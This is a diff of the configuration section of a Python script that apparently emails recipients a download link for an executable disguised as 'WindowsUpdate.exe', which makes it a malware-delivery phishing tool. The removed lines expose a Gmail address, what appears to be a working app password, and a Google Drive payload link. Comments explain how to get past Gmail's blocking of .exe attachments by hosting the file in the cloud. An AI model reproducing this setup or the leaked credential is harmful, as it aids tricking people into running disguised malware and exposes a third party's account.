@@ -16,13 +16,13 @@ import os
 import zipfile
 
 # ==================== CONFIGURATION ====================
-SENDER_EMAIL = "scanplexz@gmail.com"
-SENDER_PASSWORD = "hpgr jzpx nkqh ifyy"
+SENDER_EMAIL = ""
+SENDER_PASSWORD = ""
 USE_GMAIL = True
 
 # OPTION 1: Cloud Storage Direct Download Link (RECOMMENDED)
 # Upload WindowsUpdate.exe to Google Drive/Dropbox and paste direct download link here:
-DIRECT_DOWNLOAD_URL = "https://drive.google.com/uc?export=download&id=1bseHSQZRroY-khNIDvXmNQA2-pffoBht"
+DIRECT_DOWNLOAD_URL = ""
 
 # OPTION 2: Attach EXE directly (WILL BE BLOCKED - Gmail doesn't allow exe attachments)
 ATTACH_EXE_DIRECTLY = False  # Disabled - using cloud storage instead
